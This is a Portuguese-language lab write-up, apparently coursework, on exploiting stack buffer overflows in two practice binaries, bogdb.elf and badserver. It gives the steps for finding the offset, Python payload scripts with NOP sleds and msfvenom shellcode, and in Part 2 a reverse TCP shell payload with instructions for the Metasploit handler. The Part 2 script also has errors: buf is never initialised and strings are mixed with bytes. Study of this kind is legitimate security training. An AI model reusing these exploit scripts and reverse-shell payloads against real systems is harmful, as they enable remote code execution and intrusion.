# PARTE 1

### Overflow no bogdb.elf

- Criar uma string usando msf-patten_create -l 50
- Usar essa string de entrada para o buffer
- Ao dar Segmentation Fault, sabemos que talvez escrevemos um endereço inexistente no escopo do programa no endereço de retorno da função e, portanto, RIP estará apontando para um endereço inválido, o que causa o erro.
- Executar com gdb o elf a fim de identificar nosso offset.
- Ao dar segfault, usamos o comando _info registers_ no gdb para verificar que o rbp foi preenchido com algo. Podemos, então, printar o valor do rsp, pois o valor dele é o endereço onde começam os 6 bytes de retorno que queremos preencher com um apontador para nosso shellcode no futuro. 
- Alimentar para a função msf-pattern_offset -q o valor de rsp, com isso conseguimos o offset até o retorno. No caso do bogdb.elf esse valor é de 21 bytes.
- Criar um script em python para escrever um payload binário em uma file a fim de fornecer essa file como entrada para o bogdb. Esse payload segue o seguinte formato 
````import struct
buf = b"\x41" * 21
buf += struct.pack("Q", 0x7fffffffdd20)
buf += b"\x90" * 1000
buf += b"\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50"
buf += b"\x54\x5f\x52\x66\x68\x2d\x63\x54\x5e\x52\xe8\x31"
buf += b"\x00\x00\x00\x65\x63\x68\x6f\x20\x27\x68\x65\x61"
buf += b"\x63\x6b\x61\x64\x6f\x20\x6f\x74\x61\x72\x69\x6f"
buf += b"\x20\x6b\x6b\x27\x20\x3e\x20\x48\x41\x43\x4b\x45"
buf += b"\x41\x52\x41\x4d\x5f\x4d\x45\x55\x5f\x50\x43\x2e"
buf += b"\x54\x58\x54\x00\x56\x57\x54\x5e\x6a\x3b\x58\x0f"
buf += b"\x05"

fo = open("teste.txt", 'wb+')
fo.write(buf)
fo.close()
````
- Primeiro, os 21 bytes são preenchidos com qualquer coisa, esse é nosso padding. Depois, colocamos um endereço de memória qualquer no retorno, vamos descobrir futuramente qual é o melhor lugar para mandar nosso código. Depois vem nossos NOPs: são importantíssimos porque aumentam MUITO nossa chance de acerto ao colocar um valor no ret, porque quando o fluxo de execução é desviado para um NOP o processo simplesmente continua executando até achar uma operação, nesse caso, ele continuará até encontrar nosso shellcode. Por fim, o shellcode em si, gerado pelo msfvenom.
- A linha de comando do msfvenom é a seguinte: ````msfvenom -p linux/x64/exec -f python CMD='<comando>'````, o que gera um shellcode, como no exemplo acima. 
- Executamos esse payload como entrada do bogdb.elf a fim de provocar um segfault. Depois, analisamos o core deixado pelo segfault e descobrimos, no gdb, printando a stack, qual endereço de retorno printar para ter mais chance de cair no meio dos nossos NOPs, fazemos isso usando x/300x $rsp, isso printará 300 posições da stack.
- Ao descobrir um endereço bom, basta colocar no payload.

# PARTE 2
### Overflow no badserver
- Os passos para descobrir o tamanho do buffer e o payload em si são iguais aos anteriores.
- O que muda aqui é que temos um servidor, o shellcode que vamos executar é outro: ````msfvenom -p linux/x64/shell/reverse_tcp LHOST=<ip> LPORT=<porta> -f python -b "\x00"````. Esse shellcode abrirá uma porta (definida em lport) para que o ip definido em lhost se conecte através do terminal multi/handler do metasploit. 
- Mandar o seguinte payload: 
````import struct
buf += b"\x48\x31\xc9\x48\x81\xe9\xef\xff\xff\xff\x48\x8d"
buf += b"\x05\xef\xff\xff\xff\x48\xbb\xf7\x15\x65\x7a\x25"
buf += b"\x85\x6b\xc1\x48\x31\x58\x27\x48\x2d\xf8\xff\xff"
buf += b"\xff\xe2\xf4\xc6\xea\x0f\x73\x7d\x1c\xdd\xd1\xbf"
buf += b"\x9c\xb3\x37\x14\x4c\x01\xe3\xb6\x4f\x0f\x7d\x7f"
buf += b"\x8a\x6e\x89\x72\xd5\x1d\x2b\x4f\x8f\x2a\x98\xa7"
buf += b"\x7f\x4c\x22\xbc\xef\x69\x9e\x9d\x14\x3b\x75\x20"
buf += b"\xcd\xee\x01\x8f\x2e\x2d\xed\x6d\x3c\x69\xc1\xe4"
buf += b"\xaf\x6f\x84\xf8\xc8\x3a\x89\x7e\xf3\x0f\x6a\x7f"
buf += b"\xef\x41\x99\xf8\x10\x3c\x32\xa0\x45\x12\xe4\xbe"
buf += b"\xea\xac\x0e\x3d\xd2\x01\xe2\xaf\x7f\x65\x10\x20"
buf += b"\xcd\xe2\x26\xbf\x24\x93\x75\x20\xdc\x32\x9e\xbf"
buf += b"\x90\xa5\x03\xe2\xef\x57\x99\x9d\x14\x3a\x75\x20"
buf += b"\xdb\x01\xe7\xad\x1a\x60\x32\xa0\x45\x13\x2c\x08"
buf += b"\xf3\x65\x7a\x25\x85\x6b\xc1"

pad = "\x41" * 40
EIP = struct.pack("I", 0x7ffffff780)
NOP = "\x90" * 100
shellcode = buf
print pad + EIP + NOP + shellcode
````

para abrir o reverse_tcp na porta especificada.

- Por fim, rodar msfconsole, dentro dele rodar use exploit/multi/handler, dentro desse handler precisamos setar o payload que usamos, a porta e o ip e finalmente executar com "run". 